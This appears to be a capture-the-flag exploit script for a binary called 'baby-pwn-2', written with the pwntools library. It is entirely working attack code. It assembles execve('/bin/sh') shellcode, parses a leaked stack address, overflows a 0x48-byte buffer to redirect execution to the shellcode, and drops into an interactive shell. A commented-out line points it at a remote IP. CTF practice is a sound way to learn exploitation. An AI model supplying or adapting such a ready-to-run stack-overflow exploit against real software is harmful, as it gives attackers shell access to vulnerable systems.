from pwn import *

exe = ELF('./baby-pwn-2', checksec=False)
# p = remote("34.162.119.16", 5000)
p = process(exe.path)

input()
shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rax, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64')
p.recvuntil(b'leak: ')
stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
print("Stack leak:" + hex(stack_leak))
payload = shellcode + b'a'*(0x48 - len(shellcode)) + p64(stack_leak)
p.sendlineafter(b'text: ', payload)

p.interactive()